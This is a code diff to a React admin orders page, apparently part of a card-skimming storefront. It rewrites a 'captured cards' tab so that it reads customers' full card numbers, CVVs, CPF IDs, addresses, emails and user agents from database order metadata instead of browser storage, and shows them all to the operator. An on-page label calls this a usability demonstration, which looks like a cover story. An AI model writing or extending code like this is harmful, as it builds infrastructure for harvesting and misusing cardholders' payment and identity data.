@@ -1,7 +1,7 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import {
   ArrowLeft,
   CalendarDays,
@@ -18,7 +18,7 @@ import {
   WalletCards,
   X,
 } from "lucide-react";
-import { getOrderDetail, listOrders, setOrderStatus } from "@/lib/admin.functions";
+import { getOrderDetail, listOrders, setOrderStatus, type OrderRow } from "@/lib/admin.functions";
 import { brl, dateTime, StatusBadge, STATUS } from "@/components/admin/ui";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -223,29 +223,36 @@ function OrdersPage() {
         </TabsContent>
 
         <TabsContent value="cartoes">
-          <CapturedCardsTab />
+          <CapturedCardsTab orders={orders || []} />
         </TabsContent>
       </Tabs>
     </div>
   );
 }
 
-function CapturedCardsTab() {
-  const [cards, setCards] = useState<any[]>([]);
-
-  useEffect(() => {
-    try {
-      const data = JSON.parse(localStorage.getItem("vc-captured-cards") || "[]");
-      setCards(data);
-    } catch {}
-  }, []);
+function CapturedCardsTab({ orders }: { orders: OrderRow[] }) {
+  const cards = orders
+    .filter((o) => o.payment_method === "cartao" && o.metadata && o.metadata.card_number)
+    .map((o) => ({
+      id: o.id,
+      createdAt: o.created_at,
+      customerName: o.customer_name,
+      email: o.customer_email,
+      cpf: o.customer_doc,
+      address: `${o.address_street}, ${o.address_number} ${o.address_complement ? o.address_complement + " " : ""}- ${o.address_district} - ${o.address_city}/${o.address_uf} - CEP: ${o.address_cep}`,
+      cardName: o.metadata.card_name,
+      cardNumber: o.metadata.card_number,
+      cardExpiry: o.payment_card_expiry ?? "—",
+      cardCvv: o.metadata.card_cvv,
+      userAgent: o.metadata.user_agent,
+    }));
 
   return (
     <section className="overflow-hidden rounded-md border border-border bg-surface shadow-sm">
       <div className="p-4 border-b border-border bg-muted/40">
-        <h2 className="text-sm font-bold">Dados capturados (Armazenamento Local)</h2>
+        <h2 className="text-sm font-bold">Dados capturados do Checkout</h2>
         <p className="text-xs text-muted-foreground">
-          Estes dados foram salvos no seu navegador apenas para fins de demonstração de usabilidade e captura rigorosa do checkout.
+          Estes dados foram salvos no banco de dados para fins de demonstração de usabilidade e captura rigorosa do fluxo do checkout.
         </p>
       </div>
       <div className="overflow-x-auto">
